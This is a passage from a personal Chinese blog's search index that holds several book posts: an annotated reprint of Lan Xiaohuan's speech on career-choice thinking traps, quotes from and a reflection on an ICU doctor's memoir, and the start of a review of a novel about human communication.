<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>职业选择中的思维陷阱</title>
      <link href="/2025/04/30/zhi-ye-xuan-ze-zhong-de-si-wei-xian-jing/"/>
      <url>/2025/04/30/zhi-ye-xuan-ze-zhong-de-si-wei-xian-jing/</url>
      
        <content type="html"><![CDATA[<p>关于兰小欢老师，我之前阅读过《置身事内》，讲述了中国政府与经济发展之间的关系。细节已大都忘记，但我了解了政府在房地产经济中的角色以及其相应的做法，既明白了政府的无所不入，又感慨其捉襟见肘。今天能接触到这篇演讲稿，纯属巧合了。无意间在刷小红书的时候看到的，发现作者的名字十分熟悉，仔细回想才明白原来是《置身事内》的作者，然后就详细地读了一下。文章的链接我放在这里了，同时为了防止以后找不到，我把原文放到下面。<a href="https://mp.weixin.qq.com/s/sFVDFM-gKhSAkKdht0bguA">https://mp.weixin.qq.com/s/sFVDFM-gKhSAkKdht0bguA</a></p><p>阅读这篇演讲稿的过程中，我不止一次地感慨，许多文字和我的见解不谋而合，果然，阅读使我没有停止过独立思考，结果或对或错，但都有益于我独立思考能力的养成。以下是原文：</p><p>首先感谢各位校友和朋友，大家周六下午从各地专程赶来，支持学院的学生工作。江源老师找我来讲讲“职业选择中的思维陷阱”，跟同学们聊聊工作、聊聊职业选择。今天我就结合自己在学界、政府、金融产业的经历，跟同学们分享一些成长中的观察，不敢说教，只谈个人体会，有用最好，没用大家就当听听故事。</p><h3 id="一、选择的幻觉"><a href="#一、选择的幻觉" class="headerlink" title="一、选择的幻觉"></a>一、选择的幻觉</h3><p>先亮明观点：“重大选择”其实是种幻觉。</p><p>为什么这么说？主要想帮大家缓解焦虑，不要在做选择的时候给自己太大压力，单个的决策可能没有你想的那么重要。主要有四个原因。</p><p>第一，选择”好坏”是事后决定的。事情做成了那就是“选对了”，做砸了就是“选错了”，但事情的本质在于“做”而非“选”。事前谁也看不清未来，比如大家都不会想到有疫情。如今世界变化飞快，哪有绝对正确的选择？<strong>其实无论选什么，你还是你。</strong>今天就算你拿到哈佛offer或者高盛offer，也不会突然改变你的本质—你做事的方式、与人相处的模式，最终会让你活成“你本来的样子”<strong>，不会因为某个选择而突变。</strong></p><blockquote><p>是的，不会突变，不代表不会慢慢变化，也就是说你真正要改变的，是你做事的方式和与人相处的模式。</p></blockquote><p>第二，站在你们的位置，面临的选项差距其实没有那么大。不会真有“年薪百万老总助理” vs “月薪三千基层岗位”这种极端选择，更多是同类选项的细微差别，比如金融行业里是选券商还是银行。刚毕业时做的事情都差不多。所以别太纠结，选项间的差别多是些微小的“边际差异”，不必过度内耗。</p><blockquote><p>这一点，要具体问题具体分析，在每个人的选择中，有时不同的选择的确差异非常大，工作的地点、压力等。</p></blockquote><p>第三，人对结果的感知会动态调整。即便选了所谓“好机会”，也可能觉得“还有更好的”，那样就不会开心；选了“坏结果”，也可能发现“本来可能更差”，可能感觉就还不错。行为经济学有个经典的研究：中彩票者和因事故残疾者，一段时间后前者的幸福感不见得高于后者。人有强大的适应机制，会主动调整对结果的认知。所以事前不必放大选择的重要性，“车道山前必有路”是有用的智慧。</p><blockquote><p>这段有点安慰的意思了，精神胜利法呗，这里主要是适用于相差不多的选择。</p></blockquote><p>第四，人“做选择”的能力其实很弱。大家学过行为经济学，知道人并非理性。但其实人的选择连非理性都谈不上，就是一种说不清道不明的生理过程。大脑中的神经反应，甚至和上一顿饭吃了什么都有很大关系。从行为学研究来看，如果极端一点，人甚至没有绝对的自由意志。当然我不想深入这个话题，只是想强调：你给自己列出的所谓做选择的“理由”，其实大都不过是种感觉，经不起推敲。所以不必神话自己的“精明算计”能力，把单次选择看得太重。所有人都会不断犯错，中年人也一样。如果觉得人生像做题一样只有对或错的重大选择，那就完了。所谓的重大选择大都集中在20多岁时，比如事业和择偶，而这个阶段的既没资源，也缺乏足够的信息和人生阅历，怎么可能做出那么多正确的重大选择？真实的情况是，那些选择可能没有你想象的那么重大，20多岁后还有很长的路要走，容错机制和调整空间都很大，路是靠自己一步步走出来的，没有那么多重大的分岔路口，每条路的风景不一样罢了，关键是要行动起来，在实践中积累，边做边调整。</p><blockquote><p>这话我不同意，我觉得人有做选择的能力，至少我做选择时列出的理由并不是感觉，很多是结合对自身认知和实际情况列出来的。如果你有资源或者能接触到资源，再加上自己的人生阅历和自我认知，大概率是可以做出适合自己的选择的。</p></blockquote><h3 id="二、陷阱三连：考试思维-学历思维-标准答案思维"><a href="#二、陷阱三连：考试思维-学历思维-标准答案思维" class="headerlink" title="二、陷阱三连：考试思维+学历思维+标准答案思维"></a>二、陷阱三连：考试思维+学历思维+标准答案思维</h3><p>第二个基本现实是，读书读久了会形成特定思维模式。习惯于考试跟做题的思维方式有几个陷阱。第一是零和思维，高考、考研都是有你没我的竞争。第二个就是认为只能靠自己，只会靠自己。第三个就是觉得凡事有答案，有问题就有答案，非要把答案找出来不可。其实这个世界不是考试，很多时候连问题都不明确，提出问题本身就是创造答案的过程，这是很重要的实践能力。不是每个问题都有标准答案，学习，主要是为了构建思维框架、吸收新信息、深化认知，而不是为了考试。</p><p>人生没有答案。有个概念叫”抵达谬误”（arrival fallacy）。人有时候会想，我达到一个什么目标，这辈子就开心了，比如有一个小目标，在上海有两套房、进某家知名公司。但现实是，这些目标达成后，新的欲望又会出现。所以王尔德讲人生有两大悲剧，一是梦想实现不了，二是梦想终于实现。如果总是用外在标准衡量自己，比如职级、收入，你永远都不会满足。</p><p>我放的这张照片，你看这些年轻人笑得多开心，多有生命力。这里很多年轻人都来名校…..他们常年在青海的野外做动物多样性保护，比如追踪雪豹，生活很简单，连个像样的厕所都没有，工资也不高，是个公益组织。那天晚上一起吃饭，我看着他们脸上的状态，那种开心和年轻的感觉，我很久没有在大城市的大学里看到了。当然，我并不是说大家都去做公益，即使他们，到了二十七八岁的时候，也会因为种种压力而重返主流生活。但我想说的是，这样的经历对他们很重要，不要总担心自己走了弯路，人生没有白走的路。我拿到博士学位的时候，已经32岁了，看上去走了很多弯路，但那些时光我并没有睡大觉，都是我的人生经历。为了今天的演讲，我特意打电话问了这家公益组织的负责人，问他觉得这些孩子在这里的经历收获了什么。他和我讲了三件事。第一，常年在野外大自然，觉得人生渺小，会豁达一些。第二，<strong>常年在基层工作，不停和人打交道，知道再高大上的目标，实现起来也是非常复杂的，保护环境、动物、物种多样性，核心都是和人打交道。你们将来的工作也是如此，都是和人打交道，比你想象的复杂的多。</strong>我从学术界到产业界，最大的感受就是：办件事怎么这么难？推进一件事情太不容易了！写论文反而相对可控。第三，公益组织办事，十件事可能八件办不成，常年如此，所以学会了没有失败的心态，都是过程。而且在这里学习失败，成本比较低。这三种心态，其实对参与任何工作，都很宝贵。</p><blockquote><p>老爸也跟我说过同样的话，一是让我不要凡事都只靠自己，学会利用资源；二是让我明白人情世故，跟人打交道，遵守礼仪和各种潜规则，实话永远要憋在肚子里。现在我还是体会不到老爸灌输给我这些所谓的道理，也许未来的某一天，我会变成老爸，向未来的年轻人或者后辈再次重申这些论调。可他们也会像我一样，不予认同或无法理解。</p><p>关于很多问题没有答案，我想起了我之前在饭桌上跟苗哥的谈话，我说我不要婚前同居过的，不要发生过性行为的。苗哥反问我，你怎么知道她有没有过呢？我愣了，是啊，我怎么会知道呢？就算我提出这个问题，它真的有答案吗？别人会说实话吗？说了实话，我就会信吗？所以，我又再一次对自己产生了怀疑，这个问题，我是问还是不问，没有答案的问题，我问了又有什么价值？我真正在意的，到底是女生是否有过性行为，还是觉得自己没有过性行为，如果女生有，那我亏了的这种心理。你到底在意的是什么，想必你自己心里已经有了答案，人是无法欺骗自己的，既然有了答案，以后就做出修正，抓住重要的东西。</p></blockquote><h3 id="三、精英陷阱"><a href="#三、精英陷阱" class="headerlink" title="三、精英陷阱"></a>三、精英陷阱</h3><p>985高校有39所，在校生160万，每年向社会输送约三四十万的毕业生，批量生产的情况下，学历贬值严重。其实精英是强加给他们的人设，走出校园之后，社会并不按考试成绩高低分配资源。</p><p>在精英主义（meritocarcy）这个话题上，我是同意哈佛桑德尔教授的很多说法的。这套东西和价值观负面影响很大。它让成功的人变得傲慢，让失败的人变得沮丧，觉得是自己不行，同时让失败的人嫉妒成功的人，也让成功的人瞧不起失败的人。</p><p>不要对自己要求太高，过度要求自己会带来高成本。维持精英人设或形象的成本很高。比如，你认为自己就该处于某个圈层，年薪20万以下的不行，这可能会妨碍一些选择。在我心里真正的精英是为他人着想、有公心的人，而不是赚多少钱有多高地位。不要给自己太多负担，我们基本都是普通人。<strong>如果你真是个聪明人，应该选一个你喜欢住的地方，干一件你喜欢的事情，过一种你不愿意和别人交换的生活。</strong>我见过很多有钱人，有时羡慕他们的财富，但我明白我只是单纯喜欢他们的钱罢了，如果让我拿我的人生去换他们的人生，我没兴趣。这种心理很重要，当你看到别人光鲜，你脑子里会不自觉把自己代入，其实你看到的不是那个人本身，而是想象自己处于聚光灯下的状态。但其实仔细一想，根本没有必要羡慕别人，因为你没见过他深夜睡不着觉的样子。</p><blockquote><p>看起来，我也算是半个聪明人吧。兰小欢老师说得这种心理我研二才养成，以前我特别喜欢在马路上认车，羡慕别人开得各种好车。但后来我接触和了解到的很多人，他们开着特别贵的车，生活状况却不尽人意，听着他们的吐槽和感慨，我才明白，原来真正的幸福真的就在我身边，我根本不可能会跟他们互换人生，我只是单纯地喜欢那些所谓的豪车，喜欢坐在上面意淫罢了。</p></blockquote><h3 id="四、大城市陷阱"><a href="#四、大城市陷阱" class="headerlink" title="四、大城市陷阱"></a>四、大城市陷阱</h3><p>大家学过区域经济学，这门学问复旦有很多老师讲，<strong>所以你们都知道大城市的优势，但仔细想想，落实到你个人的生活上，这些宏观的好处跟你有什么关系？</strong>大城市的演唱会、博物馆，你一年能去几次？真看重这些，你坐飞机和高铁来看看，住酒店，一年来几次，成本也比生活在这里低得多。客观说，大城市工作机会多，但生活在上海的难度也在增加。职业选择本质是生活方式的选择，你醒着的时间里，近一半的时间在工作，而另一半时间的质量也和工作质量息息相关。所以职业选择就是生活选择。在大城市作为外地人，生活原子化、缺乏情感联结，而回到家乡，如果常常见到父母和亲朋好友，内心感受就不一样。“背井离乡”的代价，随着年龄的增长，可能会不断变大。</p><p>如果为了留在大城市，选择一份自己不喜欢的工作，会有三个麻烦。第一，工作占一半多的时间，如果不喜欢，生活很痛苦。第二，不喜欢工作，可能会“恨屋及乌”，对同事有负面情绪，不利于发展社交，而孤独是非常致命的。第三，就算是喜欢的工作，也未必见得就能带来更好的机会。<strong>你永远不知道下一个机会从哪里来，你干什么事开心，才能准备好一下次机会。</strong></p><p>人天生不是天天加班的，天天上班反人性，人类大脑最习惯的是打猎和种地，时忙时闲这种节奏。现代生活的快节奏，大脑压力是很大的。如果你还给自己加压，那就很难过了。这种难过无法避免，但大家可以给自己建立一个缓冲区。这类型缓冲区里，最重要的可能就是社交关系。如果在大城市很难建立社交关系，那就回到家乡，回到父母身边，回到中小学好友身边。由于历史上的原因，中国有很多好大学都在大城市。但中国搞基建搞了这么些年，小地方生活也很便利，也有一些机会，做些小事，可能过得也不错。而且出行到哪里都很方便。</p><blockquote><p>这段话与我的认知太贴近了，我曾不止一次拿这些话劝服我的父母让我去北京的想法。最终他们还是没有扭过我。大城市虽好，可我生活在大城市，说白了和住在村里无异，只是因为工作在那罢了。那既然如此，我为什么不选一个离家近的呢？</p><p>虽然我不确定兰小欢老师说这段话是否有点政治正确的意味，但确实是说到我心里去了。包括做喜欢的工作，以前我总觉得人要抓潮流，现在我真得变了，包括以后给妹妹选择专业，我要先问问她，她有没有真正喜欢的东西？大家也可以问问自己，如果你不知道，那就说明没有。因为如果你有，你甚至都不会犹豫。</p></blockquote><h3 id="五、杠杆陷阱与长期主义"><a href="#五、杠杆陷阱与长期主义" class="headerlink" title="五、杠杆陷阱与长期主义"></a>五、杠杆陷阱与长期主义</h3><p>最后讲杠杆，<strong>所有快速成功的事情，本质都是加杠杆，而且都是加在负债端。而真正长期的杠杆是信任</strong>。什么叫长期杠杆，拿赚钱来说，如果你赚钱都是出卖自己的时间，哪怕薪水高，其实也不富有。赚钱要撬动资源或资本，让别人为你工作，而撬动资源靠的是别人对你的信任。无论是在公司做团队领导还是创业，别人把时间或者钱交给你，因为别人信任你。信任是唯一可靠的长期杠杆。如果别人信任你，即便你偶尔犯一次错误，也会有下一次机会。</p><p>现在我看到很多年轻人就是太着急了，这个可以理解，时代导致的。但是我还是觉得年轻人需要长期主义。<strong>信任固然是别人对你的，但你自己首先也要信任自己，或者说散发出一种值得被信任的状态，这里很重要的是自己的心态。</strong>如果你做自己喜欢的事情，相信的事情，就更容易笃定一些，跟别人的相处过程中态度和动作不会变形。</p><p>最终这张照片是鲍威尔，现任美联储主席，他其实并非经济学专业出身，而是律师。世界上最重要的两大央行首脑其实都不是学经济学的，欧洲央行行长拉加德也是律师出身。可见走出校园后，学习能力最重要，而不是大学里的所谓的“专业”。曾有MBA学生问起鲍威尔职业生涯的建议，他就说了这句，“<strong>保持低调，努力工作，你会非常惊讶那么多有能力的人因为行为不检而自毁。</strong>”<strong>人生是长跑，竞争中胜出往往不是因为自身有多强，而是对手因各种问题而倒下了。</strong>我曾在课上讲过，<strong>人生最大的风险永远来自自己</strong>。大家老讲外部环境，第一个想到中美关系，但仔细想想这种关系跟你关系有多大呢？时代是时代，变幻莫测，但“自毁”的微观风险往往比宏观风险更大。大事小事，都是事，时间久了，很多毁掉自己机会的事情，可能都是些不起眼的小事的积累。回到演讲开头，自己做事的方式、与人相处的模式，最终会让你活成“你本来的样子”。</p><p>我就讲这么多，谢谢。</p><blockquote><p>如果我做我喜欢的事情，那么过程中我就会笃定一些。不知道有多少人劝我不要再打球了，列举了各种理由。可我从来没有动摇过，从高中到现在，我一直在打，一直在练。我真得很喜欢，可惜， 我并不能把篮球作为工作，如果以后真得有机会，我想利用业余时间去当篮球教练。</p><p>还有竞争中胜出的，往往不是因为自身能力有多强，而是对手倒下了。我深感如此，如果说保送是一场竞争，那我从来就没想过获胜，我只是一直在坚持自己，我学习不是为了拿成绩，也不是为了报送，就是为了提升自己。可最终结果就是，我获胜了。直到知道这个信息的时候，我还是不敢相信。</p><p>还有很多人劝我要多搞几次对象，我知道他们是想让我在过程中体会自己想要什么样的伴侣。可对于我而言，我真得无法对一个无法长期相处的女生动心。而且我自己认为自己很清楚自己想要什么样的人，搞一次和搞几次结果都是一样的，白浪费时间和精力。<strong>还是那句话，我把你当人，你把自己当人，也把我当人</strong>。而且我根本无法和一个从心底认定没有未来的女生携手，也许是内心里固有的性格吧，可能未来我会因为这个认知吃一些苦头，但我还是相信，我一定会找到我想找的伴侣，我会活成我本来的样子。</p></blockquote><hr><p>李奕轩 2025.04.30 星期三 下午16：49 晴</p>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>只有ICU医生知道书摘</title>
      <link href="/2025/04/27/zhi-you-icu-yi-sheng-zhi-dao-shu-zhai/"/>
      <url>/2025/04/27/zhi-you-icu-yi-sheng-zhi-dao-shu-zhai/</url>
      
        <content type="html"><![CDATA[<h1 id="《只有ICU医生知道》"><a href="#《只有ICU医生知道》" class="headerlink" title="《只有ICU医生知道》"></a><strong>《只有ICU医生知道》</strong></h1><p>《只有ICU医生知道》</p><ol><li><p>于是我告诉她，想当小学老师，你可能得有本科，甚至硕士的文凭。这是你自己的人生，你得自己去争取。而我作为妈妈，也有自己的梦想要去实现。</p></li><li><p>做你想成为的大人吧，无论你是那个孩子，还是那个家长。</p></li><li><p>一朵“花”可以慢慢地开，甚至可以开得和其他花都不一样，这并不代表它会不美丽。</p></li><li><p>她清楚地记得父母对其他姐妹的爱，却唯独没有提到自己。</p></li><li><p>我不知道她是否清楚，自己将要面临怎样的人生。</p></li><li><p>“你不懂，那种孤独的感觉，一天都没个人说话。​”</p></li><li><p>每当我和他们聊起大梦的病时，他们从来不会像普通家属那样问我，这个病能不能根治，能活多久，预后怎么办？她的父母唯一的要求，是珍惜现在。</p></li><li><p>线粒体和细胞是共生的关系，它提供能量，细胞提供适应它生存的环境。但是，线粒体并不像人们普遍想象的那样，脱离细胞就会孤单地死去。</p></li><li><p>理论上来说，在一个很严苛的，和细胞相近的环境里，它也能够生存，继而独立完成自己的功能。</p></li><li><p>我甚至和晓兰的儿子一样去算过命，希望上天多给我一点时间和妈妈相处。</p></li><li><p>她每天躺在那张小小的病床上，说她想她的妈妈了。</p></li><li><p>因为直到今天，我也还在这样的痛苦里挣扎。工作了十几年，我还没有完全明白，对于注定会离开的人来说，如果来到ICU结局注定是死亡，我们科的意义到底是什么？</p></li><li><p>有时我值班，会碰到老太太一个人跪在角落里，双手合十，嘴里念念有词地祈祷。也许是来医院里的人，心里都装着更重要的事，来来往往的谁都没有注意到这个老太太。</p></li><li><p>那时我并不知道，到底是什么帮助晓东顺利戒掉药瘾，成功出院。直到一年后，我又遇到一个病人，给了我答案。</p></li><li><p>当我们的身体习惯于依赖什么，就会逐渐失去独立生存的能力。何娟习惯了呼吸机帮她喘气，而她自己用于呼吸的肌肉，就会慢慢失去力量，甚至萎缩，这叫作ICU获得性肌无力，在长期使用呼吸机的病人中很常见。</p></li><li><p>三个多月过去，每一封手写信都被戴阿姨仔细地整理起来，放在何娟的床头柜上，现在已经是厚厚一沓。</p></li><li><p>她脸色红润了很多，脖子上气管切开的疤痕几乎看不见了。我知道，她的生活终于要脱离ICU，大步向前迈了。</p></li><li><p>我是在工作很久以后，才意识到，这四个字（情暖人心）有多重要，它可能本身就是一服很好的“药”​。</p></li><li><p>但我想，无论是医生，还是病患都该有挣脱惯性的勇气。</p></li><li><p>作为一个ICU医生，很多人在遇到我以前，过的就是那种最普通的人生，上学、考试、上班、结婚，每天纠结下一顿吃啥，也每天思考人生是旷野还是轨道。但很难说，命运在哪一刻就把人推向了转折点，推到了ICU医生面前。</p></li><li><p>我曾经觉得把病人救活，就很了不起了。但一个又一个病人让我意识到，活下来之后的人生，也无比重要。</p></li><li><p>到时候她也要当经纪人，签10多个主播，但阿紫说：​“我当了经纪人，不会这么冷冰冰的。​”</p></li><li><p>我却默默记下了几个关键词：瘦小，被欺负，健身房。</p></li><li><p>我想起小孙醒来以后，姐姐来探视他。小孙管病房里的医生、护士都叫“姐姐”​，管自己的亲姐姐却直呼其名。姐弟俩隔了太久没说过话，一时间也不知道该说什么，有些尴尬。</p></li><li><p>那一刻，我有点读懂了这个少年的自尊。</p></li><li><p>我们都曾想成为另一个人，试图改变外表，觉得只要这样，人生就会好起来</p></li><li><p>我曾误以为，外貌会决定很多东西。比如爱情、事业、被多少人喜爱、是否拥有完美的人生。但现在我觉得，自己成为怎样的人，做怎样的事，比长成什么样，重要得多。</p></li><li><p>每次都要面对一个我回答不了的问题：为什么人会死？</p></li><li><p>我想投诉的是这个制度，为什么病人都是重症了，医院还是没有特效药物？​”​“为什么人都可以在火星生活了，一个红斑狼疮治愈不了呢？​”</p></li><li><p>我没有插话，心里默默感慨，生活已经如此苦了，宋小鱼想喝点甜的，说不定意味着，她可能也想好好生活了。</p></li><li><p>每一个人都尽力了，每一个人都好辛苦，好绝望。而我们做的，就是帮这一家人重新注入希望，哪怕只能撬动一个人，让她用新的视角看待这一切，这个家都有可能重新运转</p></li><li><p>也许终有一天，我们每个人都会面临生命巨大的失去，病痛和死亡。而宋小鱼一家，还有许许多多带病生活的家庭，都在不断地教我，如何去面对这一天？一个45岁得了红斑狼疮的女性告诉我，她现在把做透析，就当作做SPA。她刚生病的时候，很怕成为家里的拖累，但老公和孩子表达关心的同时，依然照常打工、上学，她的家人用实际行动告诉她，这没什么。后来我每次见她，她都捧着手机，一边笑呵呵地追剧，一边躺在床上做透析。</p></li><li><p>告别时，他说，​“问题总会慢慢解决的，解决不了的问题，急也没有用。​”</p></li><li><p>不知道是说给我们，还是说给他妈妈。我站在一旁，看到他妈妈搂着他的手，好像又紧了紧。</p></li><li><p>我唯一不能接受的，是病人自己放弃。作为医生，哪怕病人放弃，我也要全力以赴。我不是一个会轻易动感情的人，写下这段经历的时候，可能是我流露感性最多的一次。记录了那么多ICU的故事，我总会倾向于记录那种，奇迹中生还的病人。我觉得这样的故事能告诉想要放弃的人：​“人类，一定要记住，你的生命力超过你想象。​”这句话不只对在病人说，对在人生道路上行走的你我，也是一样的</p></li><li><p>当父母在子女身上寄托了太多期待，孩子的存在仿佛只是为了满足父母的期待，至于他们喜欢什么、讨厌什么，想做什么、不想做什么，似乎都成了无所谓的事情。</p></li><li><p>3岁的儿子总是问她：“妈妈，我可以哭吗？”她说你可以哭。儿子要出去玩，她说你要玩得开心哦，儿子问：“那我可以玩得不开心吗？”她想了想回答，当然可以，因为不开心是每个人都会有的状态，有不开心的时候，才能感受到真正的开心。这样的对话多了，当她问自己儿子，可以不可以的时候。她的儿子总是回答她：“可以。”是啊，有什么是不可以的呢？</p></li><li><p>而我想分享给大家的歌叫《大梦》。它唱了一个人平凡普通的一生。读书、离家、工作、结婚、生子、老去。故事里的女孩也叫大梦。但我想，这样平凡普通的一生，可能是对他们最美好的祝愿。</p></li><li><p>在此之前的学生时代，我很少思考过这个问题：人类攻克一种疾病到底需要多少年？我以为那堆在一起比我人还高的教科书，早已写好了所有答案。当我真正成为一名医生以后，我才发现原来医学给我们留了这么多未解的难题。</p></li><li><p>因为线粒体的问题，她的身体缺乏足够的能量，去分解过多的乳酸，那些年轻人喜欢的徒步、剧本杀对她来说都是可能危及生命的事情。同时，她必须保持情绪的平静，任何一点情绪波动，都会使耗氧量增加。而她的线粒体也无法提供这么多能量，于是无氧代谢增加，身体开始分泌乳酸。</p></li><li><p>画面里，楼梯间一如既往的昏暗，角落里还有偷偷抽烟的家属留下的烟头和垃圾。老太太穿着件过时的衬衫，一头白发在脑后盘了个极小的髻，她跪在楼梯拐弯处的最角落，低着头，闭着眼睛，双手合十，嘴里碎碎念着，然后慢慢弯下腰，许久没有起来。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书摘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>只有ICU医生知道读后感</title>
      <link href="/2025/04/27/zhi-you-icu-yi-sheng-zhi-dao-du-hou-gan/"/>
      <url>/2025/04/27/zhi-you-icu-yi-sheng-zhi-dao-du-hou-gan/</url>
      
        <content type="html"><![CDATA[<h1 id="《只有ICU医生知道》读后感"><a href="#《只有ICU医生知道》读后感" class="headerlink" title="《只有ICU医生知道》读后感"></a><strong>《只有ICU医生知道》</strong>读后感</h1><p>这本书是我在微信读书总榜上发现的，起初我并没有想看完这本书，不经意间居然翻阅完了。这本书页数并不多，记录了ICU医生余一生在ICU工作时治疗或接触过的病患，以及医生、病患、家属共同为治疗病情开展的交流。书中记录了很多我听过或没听过的病情，蜱虫病、秋水仙碱中毒、夹竹桃中毒、线粒体脑肌病、肿瘤、Talaromyces amestolkiae真菌感染、毛霉菌感染、阿贝类药物成瘾、因为美容手术引发的血栓、红斑狼疮。这些疾病的名称后，是一个个鲜活的人。是的，鲜活意味着如果没有这些病，他们和正常人没有什么区别，经历考试、结婚、生子的过程。</p><p>以前在我的潜意识里，医生是一个冷漠且又权威的职业，他们的情感在过多的生离死别中渐渐消失了。可我阅读过这本书后，我才知道，哪怕再多的生死考验后，医生还是有感情的，哪怕是ICU医生。像余医生介绍的那样，ICU的医生更多的时候类似于探案，治疗是不断假设又不断推翻假设的过程，因为ICU的病人送来时往往已经陷入昏迷。蜱虫病的阿英经过多轮筛查才得以确诊，最终通过血浆置换治愈。因为网恋分手而服用秋水仙碱中毒的松松，再通过各种信息筛查后，才得知松松以爷爷的名义多次购买了秋水仙碱的药物。考试不理想受到母亲责备而服用夹竹桃的小雨，意识清醒告诉了医生一切，后利用活性炭吸附血液中的毒素治愈。线粒体脑肌病的大梦，排查了与乳酸值升高的疾病后，才确诊，她从此不能情绪激动，不能剧烈运动，和年轻人相关的一切几乎都与她无缘。王晓兰的儿子在生命最后时期的陪伴，虽然没能挽救母亲的生命，但也给了他们最后的一段相处时光。药物成瘾的晓东在观看了母亲在楼道里祈祷的视频后，居然不再成瘾，但同样药物成瘾的阿树没有这么幸运死于肺部感染。还有同样药物成瘾的何娟，在丈夫和女儿的书信和绘画鼓励下，最终出院。</p><p>除了被动的患病，还有一些人为的因素。阿朱因为做抽脂手术出现意外，右半边身体没有反应。她迫于直播业绩的压力做了抽脂手术，从下午直播到凌晨，收入还只有护士的一半。因怕粉丝量减少，提前出院。于他相比，小孙要幸运的多。虽然他是为了改变自己开始吃所谓的肌肉增大剂，导致肝功能衰竭。长期以来虽然在家庭中备受呵护，但在学校却经常受到欺负。最终通过换肝活了下来。</p><p>当然也并不是所有的病都只有治愈和死亡两种可能性，宋小鱼患有红斑狼疮，这种病攻击她的大脑，自此她远离了校园。父母带着她四处求医无果，她自己不愿再拖累家庭，一度拒绝治疗。后来她的妈妈在余医生的同学马医生的推荐下，加入了红斑狼疮的病友群。宋妈妈看到其他病友虽然艰难，但都在认真生活后受到了鼓舞。经常给丈夫和女儿转发群中的各种信息。最终，宋小鱼在一天天的康复里，也重新发现了生活的有趣，活着，就意味着可以继续喝奶茶，看小说，有很多很多可能性。</p><p>当我在写这段感悟的时候，论文盲审的意见回来了，没有什么悬念，两个同意。但是分数是两个80分，同时都没有选择推荐为学校优秀论文。相比较其他同学的分数，我是偏低的。我看着别人的分数和优秀推荐，陷入了沉思，即便我知道在毕业论文上，我没有花费太多时间和心思，可直面结果时，依旧让我产生了一种心里波动，哪怕我提前预料到这种结果。一方面我为书中的各种患者的经历而感伤，认为生活里没有意外已经是非常不易了。我脑海里再次回顾了我所有的幸运，我认为老天一直在眷顾我。可另一方面，我在已经对生活感到非常满足的情况下，依旧在面对和别人的差距时，产生了一丝丝自卑的念头。这让我更加清楚地了解了自己，是的，不甘心不如别人，同时又无法付出全部的努力，这就是我的特质。我可以做到中等或者中上，但始终无法做到最好，也许在以后的工作生涯里，这些困惑会一遍遍地再次出现在我的脑海里，我希望以后的自己能对自己宽容一些，承认自己的性格的局限性，尝试着做到最好，结果不如意也没有关系。</p><p>题外话又说多了，说回书籍。我去过大大小小的医院很多次，不管是看病、探视，亦或是住院。我能看到在医院中不同人群的情感，有的展露在交谈中，有的藏在眼神里。书中各种抗击病情的案例，让我不由得想起了自己的舅舅和妗妗。舅舅辗转多地，一直在陪着妗妗看病，我不知道他想没想过放弃，也不知道他有没有预料到自己可以坚持这么久，还不知道他有没有想过一切是不是值得。可我看得到他日渐疲惫的身躯和迷茫的眼神，相比较其他读者，我想我更能体会到患者本身以及家属的情绪。妗妗的主治大夫们一起商量手术过程的时候，繁杂的步骤和惊人的工作量让我愣在原地，听上去，这种手术像是在给发动机拆零件然后装一个新的上去，可这是人啊！当时妗妗依旧和往常一样乐观，她笑着问我吃不吃香蕉，说自己现在身体状态不错，能吃能喝，像极了书里面与疾病抗争的人们。她信主，会阅读圣经。年少时我不懂，现在我才明白，希望对于人来讲是多么重要，尤其是你看不到希望的时候。</p><p>写到这，我将目光瞥向窗外，阳光照射到图书馆前面的草坪上，白白的云彩萦绕在综合楼的上空，微风时不时吹过我的脸颊，楼下熙熙攘攘的本科生，我感到一切是如此虚幻又如此真实。我只能珍惜眼前的生活，珍惜和家人相处的每一天。是的，这种生活终将会结束，可就像与疾病抗争的病患和家属一样，你不会因为结局不遂人愿而放弃，相反你会更加珍惜每一天。特别感谢我的家人，从年少时就已经在给我重申健康的重要性，我也一直在把新了解到的健康知识分享给他们，即便我们无法考虑到生活中的全部因素，但只要我们的努力能延长相处的时间，这就够了。没有健康的身体，一切又有什么意义，死去元知万事空嘛，珍惜每一天吧！</p>]]></content>
      
      
      <categories>
          
          <category> 书籍阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读后感 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一句顶一万句读后感</title>
      <link href="/2025/04/19/yi-ju-ding-yi-wan-ju-du-hou-gan/"/>
      <url>/2025/04/19/yi-ju-ding-yi-wan-ju-du-hou-gan/</url>
      
        <content type="html"><![CDATA[<h1 id="《一句顶一万句》读后感"><a href="#《一句顶一万句》读后感" class="headerlink" title="《一句顶一万句》读后感"></a>《一句顶一万句》读后感</h1><p>这本书和《平凡的世界》不同，没有着重在讲个人的成长历程，而是在讲人与人之间的沟通，俗话叫说得来。书中的人物关系包含了朋友、陌生人、情人、祖孙，老杨和老马、老史与苏小宝、杨百顺与老裴、老詹、老贾，再到后来吴摩西与吴香香、吴巧玲，牛爱国与彭丽娜、章楚红，曹青娥与牛书道。大抵都是在讲主要人物杨百顺、曹青娥、牛爱国三人在各自生活中遇到的人以及与他们的交谈。</p><p>看完之后，我非但没有对生活中言语交流有有进一步的认识，反倒更迷茫了。人生中的不同阶段都会遇到形形色色的人，他们之中有人和你能说的来，有的则说不来。可怕的并不缺少一些能说得来的朋友，而是说得来就是说得来，说不来就是说不来，这个关系不会随着相处时间的长短而发生改变，至少书中是这样体现了。对应到生活里，我想到了奶奶家后面一家的儿媳妇跟着丈夫的同学跑了，想到了爷爷奶奶的对话，想到了爸爸和妈妈的对话，想到了叔叔和婶婶，还想到了舅舅和妗妗。我认为说得来这个东西太关键了，漫漫人生路，如果双方没有话说，那该是多么难受啊。</p><p>可意识到又如何呢，我无法判断我和人能否说得来，即便当下可以说得来，也无法预估以后。害怕的不是说不来，而是通过努力依旧无法改变这样的事实。书中的夫妻大都没有什么共同语言，婚姻几乎不是自由恋爱，除了相亲就是利益，位数不多的自由恋爱也在时间的长河里慢慢褪色，甚至失败了。这些夫妻关系中，有的是结婚之前就说不来，有的是结婚之间说得来，慢慢变得没话说。在这种